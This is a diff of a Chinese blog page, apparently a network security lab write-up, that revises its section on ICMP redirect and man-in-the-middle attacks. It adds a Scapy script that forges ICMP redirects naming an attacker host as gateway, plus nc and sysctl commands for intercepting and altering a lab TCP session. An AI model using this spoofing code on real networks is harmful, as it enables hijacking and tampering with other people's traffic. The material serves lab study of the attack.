@@ -287,8 +287,13 @@ unicode: "f6d2"
         </li>
       </ol>
     </li>
-    <li><a href="#中间人攻击">中间人攻击</a></li>
-    <li><a href="#实验中的关键点">实验中的关键点</a></li>
+    <li><a href="#中间人攻击">中间人攻击</a>
+      <ol>
+        <li><a href="#通信">通信</a></li>
+        <li><a href="#攻击">攻击</a></li>
+        <li><a href="#验证-1">验证</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -622,7 +627,7 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl">                      tail -f /dev/null
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>这一行说明真正的路由器其实是10.9.0.11，而不是10.9.0.1。修改脚本中的路由器ip为10.9.0.11，重新发包后还是没有用</p>
+</div><p>这一行说明真正的路由器其实是10.9.0.11，而不是我最初以为的10.9.0.1。修改脚本中的路由器ip为10.9.0.11，重新发包后还是没有用</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -692,11 +697,12 @@ unicode: "f6d2"
 </div><p>还是失败了，又把最开始的<code>.11</code>添加回去，依旧不行</p>
 <p>内核会校验包中的ICMP 序列号和受害者流量是否一样。正常情况下应该写一个新的脚本，持续监听受害者的 ICMP 包，提取 <code>id</code> 和 <code>seq</code>并发出重定向，但尝试<code>tcpdump -i eth0 icmp</code>发现根本监听不到。这是由于 Docker 网桥的单播隔离特性，攻击者无法在不进行 ARP 欺骗的情况下监听到受害者的单播 ICMP 流量。说明实验确实无法正常完成</p>
 <blockquote>
-<p>之前tcpdump能抓到是因为抓的是攻击者发给受害者的包，这次受害者并不是发给攻击者，所以抓不到了</p>
+<p>之前tcpdump能抓到是因为抓的是攻击者发给受害者的包，这次受害者的ping包并不是发给攻击者，所以抓不到了</p>
 </blockquote>
 <h2 id="中间人攻击">中间人攻击
-</h2><p>攻击的核心并不是重定向本身，而是通过重定向使流量经过攻击者，实现对流量的控制。此时攻击者已经处于通信路径中间，但默认情况下数据仍然是直接转发的，需要对数据进行拦截和修改。</p>
-<p>在目标主机上开启监听</p>
+</h2><p>攻击的核心并不是重定向本身，而是通过重定向使流量经过攻击者，实现对流量的控制。此时攻击者已经处于通信路径中间，但默认情况下数据仍然是直接转发的，需要对数据进行拦截和修改</p>
+<h3 id="通信">通信
+</h3><p>在目标主机上开启监听</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -707,7 +713,7 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl">nc -lp 9090
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>受害者发起连接：</p>
+</div><p>受害者发起连接</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -716,7 +722,7 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc 192.168.60.5 9090
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>通信建立后，在恶意路由器上关闭内核转发：</p>
+</div><p>通信建立后，在恶意路由器上关闭内核转发，这是为了防止数据包在被脚本篡改之前就被系统转发走</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -727,20 +733,60 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl">sysctl net.ipv4.ip_forward=0
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>关闭转发的目的是避免数据包直接由内核转发，从而使用户态脚本能够接管数据路径。</p>
-<p>随后运行中间人脚本：</p>
+</div><img src="10.png" style="width: 100%;" />
+<h3 id="攻击">攻击
+</h3><p>写一个中间人脚本<code>mitm_nc.py</code>，脚本通过嗅探并重构 TCP 数据，实现对通信内容的修改</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">victim_ip</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">router_ip</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.11&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">attacker_ip</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.111&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_ip</span> <span class="o">=</span> <span class="s2">&#34;192.168.60.5&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 构造受害者正在通信的数据包</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">victim_ip</span><span class="p">,</span><span class="n">dst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">)</span> <span class="o">/</span> <span class="n">ICMP</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 网关发给受害者一个ICMP重定向并附带数据包</span>
+</span></span><span class="line"><span class="cl"><span class="n">redirect</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">router_ip</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">victim_ip</span><span class="p">)</span> <span class="o">/</span> \
+</span></span><span class="line"><span class="cl">           <span class="n">ICMP</span><span class="p">(</span><span class="nb">type</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">gw</span><span class="o">=</span><span class="n">attacker_ip</span><span class="p">)</span> <span class="o">/</span> \
+</span></span><span class="line"><span class="cl">           <span class="n">send_packet</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 发送5次攻击报文</span>
+</span></span><span class="line"><span class="cl"><span class="n">send</span><span class="p">(</span><span class="n">redirect</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行中间人脚本</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd /volumes
-</span></span><span class="line"><span class="cl">python3 mitm_nc.py
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 mitm_nc.py
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>脚本通过嗅探并重构 TCP 数据，实现对通信内容的修改。</p>
-<p>在受害者端发送特定字符串，例如：</p>
+</div><h3 id="验证-1">验证
+</h3><p>在受害者端发送特定字符串，例如：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -758,29 +804,7 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AAAAAAAA
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>说明数据已在传输过程中被修改，中间人攻击成立。</p>
-<hr>
-<h2 id="实验中的关键点">实验中的关键点
-</h2><p>ICMP 重定向并不是无条件生效，需要存在对应的通信流量，否则内核可能直接忽略报文。</p>
-<p>路由缓存存在时间限制，实验操作需要在有效期内完成，否则需要重新触发攻击。</p>
-<p>中间人阶段如果不关闭内核转发，数据包会绕过用户态脚本，导致无法修改内容。</p>
-<p>MAC 地址配置错误容易导致网络异常甚至形成循环转发，需要保证脚本中的目标地址准确。</p>
-<hr>
-<blockquote>
-<p>知识小结</p>
-<p>ICMP 重定向本质是对主机路由缓存的动态修改机制，在缺乏认证的情况下可以被伪造利用。</p>
-<p>攻击的核心不在于重定向本身，而在于借此进入通信路径，实现对流量的控制。</p>
-<p>中间人攻击依赖对数据路径的完全接管，单纯的流量转发无法达到篡改效果，需要在内核转发与用户态处理之间做切换。</p>
-<p>从实现上看，攻击链条可以拆分为路径劫持与数据处理两个阶段，两者缺一不可。</p>
-</blockquote>
-<p>ICMP Redirect 并不是收到就一定会生效，Linux 内核会检查多个条件，包括：</p>
-<ul>
-<li>Redirect 是否来自默认网关</li>
-<li>当前是否确实存在对应通信</li>
-<li>Redirect 中携带的原始数据包是否合法</li>
-<li>新网关是否与本机处于同一网络</li>
-<li>路由是否允许被重定向</li>
-</ul>
+</div><p>说明数据已在传输过程中被修改，中间人攻击成立</p>
 
 </section>
 
@@ -1147,10 +1171,12 @@ unicode: "f6d2"
       
       
       
+      
+      
       共发表文章 
-      <span class="number-highlight">24</span> 
+      <span class="number-highlight">25</span> 
       篇 ，总计 
-      <span class="number-highlight">89.90</span> 
+      <span class="number-highlight">94.86</span> 
       k 字
   </div>
   <div>
@@ -1194,6 +1220,10 @@ if (busuanziValue) {
 }
 </script>
     <section class="powerby">
+        
+        
+        
+        
         
         
         
